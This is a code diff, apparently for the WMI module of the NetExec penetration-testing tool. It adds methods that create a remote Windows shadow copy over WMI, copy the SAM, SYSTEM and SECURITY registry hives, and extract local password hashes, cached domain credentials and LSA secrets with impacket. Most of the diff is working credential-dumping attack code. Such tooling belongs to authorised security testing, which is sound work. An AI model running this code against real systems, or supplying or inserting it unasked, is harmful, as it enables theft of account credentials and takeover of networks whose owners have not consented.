@@ -11,6 +11,7 @@ from nxc.protocols.wmi import wmiexec, wmiexec_event
 from impacket import ntlm
 from impacket.uuid import uuidtup_to_bin
 from impacket.krb5.ccache import CCache
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5 import transport, epm
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck
@@ -367,6 +368,7 @@ class wmi(connection):
                 return True
 
     def read_file(self, remote_path):
+        self.logger.debug(f"Try reading file {remote_path}")
         escaped_path = remote_path.replace("\\","\\\\")
         
         # Load the Namespace
@@ -374,12 +376,12 @@ class wmi(connection):
             powershellv3_namespace = self.iWbemLevel1Login.NTLMLogin("//./root/Microsoft/Windows/Powershellv3", NULL, NULL)
             self.iWbemLevel1Login.RemRelease()
         except Exception as e:
-            logging.debug(f"Cannot load WMI Namespace {namespace_name}: {e}")
+            self.logger.debug(f"Cannot load WMI Namespace //./root/Microsoft/Windows/Powershellv3: {e}")
             return None
 
         # Read the file
         try: 
-            object_path = f'PS_ModuleFile.InstanceID="{remote_path}"'
+            object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
             iWbemClassObject, _ = powershellv3_namespace.GetObject(object_path)
         except DCERPCSessionError as e:
                 if e.error_code == 0x80041002:
@@ -404,23 +406,162 @@ class wmi(connection):
         return file_content
 
     def get_file_single(self, remote_path, download_path):        
-        self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
 
         if self.args.append_host:
             download_path = f"{self.hostname}-{remote_path}"
 
         file_data = self.read_file(remote_path)
         if file_data is None:
-            self.logger.fail(f'Could not get file "{remote_path}"')
+            return False
         else:
-            self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
+            
             with open(download_path, "wb+") as file:
-                file.write(file_data)  
+                file.write(file_data)
+            return True
 
     @requires_admin
     def get_file(self):
         for src, dest in self.args.get_file:
-            self.get_file_single(src, dest)
+            self.logger.display(f'Copying "{src}" to "{dest}"')
+            if self.get_file_single(src, dest):
+                self.logger.success(f'File "{src}" was downloaded to "{dest}"')
+            else:
+                self.logger.fail(f'Could not get file "{src}"')
+
+    @requires_admin
+    def sam(self):
+        output_filename = self.output_file_template.format(output_folder="sam")
+
+        # Get the Namespace
+        try:
+            cimv2_namespace = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
+            self.iWbemLevel1Login.RemRelease()
+        except Exception as e:
+            self.logger.fail("Could not dump SAM")
+            self.logger.debug(f"Cannot load WMI Namespace //./root/cimv2: {e}")
+            return
+
+        # Creating Shadow Volumes
+        try:
+            win32_shadow_copy,_ = cimv2_namespace.GetObject("Win32_ShadowCopy")
+            self.logger.debug("Trying to create SS remotely via WMI")
+            result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
+            shadow_id = result.ShadowID
+            self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
+        except Exception as e:
+            self.logger.fail("Cannot create ShadowCopy")
+            self.logger.debug(e)
+            return
+
+        # Finding it on disk
+        iEnum_shadow_copies = cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
+        obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
+        props = obj.getProperties()
+        shadow_copy = {k: v["value"] for k, v in props.items()}
+        self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
+            
+        # Get the SAM hive
+        sam_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SAM"
+        sam_hive_recovered = self.get_file_single(sam_hive_path, f"{output_filename}.sam")
+        if sam_hive_recovered:
+            self.logger.debug("Got SAM hive")
+            
+        system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
+        system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
+        if system_hive_recovered:
+            self.logger.debug("Got SYSTEM hive")
+        
+        # Delete the ShadowCopy
+        wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
+        self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
+        ret = cimv2_namespace.DeleteInstance(wmiPath)
+        if (ret.GetCallStatus(0) & 0xffffffff) != 0:
+            self.logger.fail(f"Could not delete ShadowCopy ID {shadow_id}. You will need to delete this by yourself.")
+        else:
+            self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
+
+        if not (sam_hive_recovered and system_hive_recovered):
+            self.logger.fail("Could not get hives")
+            return
+
+        local_operations = LocalOperations(f"{output_filename}.system")
+        boot_key = local_operations.getBootKey()
+        SAM = SAMHashes(
+                f"{output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+        SAM.dump()
+        SAM.export(output_filename)
+
+    @requires_admin
+    def lsa(self):
+        output_filename = self.output_file_template.format(output_folder="lsa")
+
+        # Get the Namespace
+        try:
+            cimv2_namespace = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
+            self.iWbemLevel1Login.RemRelease()
+        except Exception as e:
+            self.logger.fail("Could not dump LSA")
+            self.logger.debug(f"Cannot load WMI Namespace //./root/cimv2: {e}")
+            return
+
+        # Creating Shadow Volumes
+        try:
+            win32_shadow_copy,_ = cimv2_namespace.GetObject("Win32_ShadowCopy")
+            self.logger.debug("Trying to create SS remotely via WMI")
+            result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
+            shadow_id = result.ShadowID
+            self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
+        except Exception as e:
+            self.logger.fail("Cannot create ShadowCopy")
+            self.logger.debug(e)
+            return
+
+        # Finding it on disk
+        iEnum_shadow_copies = cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
+        obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
+        props = obj.getProperties()
+        shadow_copy = {k: v["value"] for k, v in props.items()}
+        self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
+            
+        # Get the SECURITY hive
+        security_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SECURITY"
+        security_hive_recovered = self.get_file_single(security_hive_path, f"{output_filename}.security")
+        if security_hive_recovered:
+            self.logger.debug("Got SECURITY hive")
+            
+        system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
+        system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
+        if system_hive_recovered:
+            self.logger.debug("Got SYSTEM hive")
+        
+        # Delete the ShadowCopy
+        wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
+        self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
+        ret = cimv2_namespace.DeleteInstance(wmiPath)
+        if (ret.GetCallStatus(0) & 0xffffffff) != 0:
+            self.logger.fail(f"Could not delete ShadowCopy ID {shadow_id}. You will need to delete this by yourself.")
+        else:
+            self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
+
+        if not (security_hive_recovered and system_hive_recovered):
+            self.logger.fail("Could not get hives")
+            return
+
+        local_operations = LocalOperations(f"{output_filename}.system")
+        boot_key = local_operations.getBootKey()
+        LSA = LSASecrets(
+            f"{output_filename}.security",
+            boot_key,
+            None,
+            isRemote=None,
+            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+        )
+        LSA.dumpCachedHashes()
+        LSA.dumpSecrets()
 
     @requires_admin
     def wmi_query(self, wql=None, namespace=None, callback_func=None):
